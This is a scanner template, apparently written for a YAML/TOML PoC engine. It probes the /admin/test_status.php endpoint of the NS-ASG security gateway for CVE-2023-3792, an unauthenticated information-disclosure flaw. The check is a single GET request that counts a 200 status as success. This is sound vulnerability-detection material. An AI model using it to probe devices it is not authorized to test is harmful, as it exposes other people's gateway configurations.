[info]
author = "ave"
description = "检测目标 NS-ASG 安全网关 /admin/test_status.php 接口是否存在未授权访问漏洞，攻击者可无需认证直接获取设备敏感配置信息"
id = "POC-AVE-2023-0001"
name = "网康 NS-ASG 安全网关信息泄露漏洞 PoC"
severity = "medium"
tags = ["ave-2023-0001"]
vuln_id = [
    "CVE-2023-3792",
    "AVE-2023-0001",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/admin/test_status.php"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
